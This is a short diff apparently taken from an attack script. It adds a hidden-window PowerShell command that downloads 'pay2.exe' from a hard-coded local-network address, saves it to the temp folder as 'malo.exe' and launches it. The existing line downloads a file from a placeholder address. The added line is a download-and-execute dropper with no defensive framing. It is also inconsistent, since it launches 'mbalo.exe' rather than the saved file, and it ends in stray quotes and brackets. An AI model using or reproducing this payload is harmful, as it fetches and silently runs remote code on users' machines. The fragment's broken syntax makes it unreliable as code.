@@ -1,1 +1,5 @@
 powershell -command "(new-object System.Net.WebClient).DownloadFile('http://IP_ADDRESS/index.html','%USERPROFILE%\AppData\Local\Temp\file2.txt')"
+
+
+
+powershell -windowstyle hidden (new-object System.Net.WebClient).DownloadFile('http://192.168.10.107/pay2.exe','%TEMP%\\malo.exe'); Start-Process \"%TEMP%\\mbalo.exe\""));
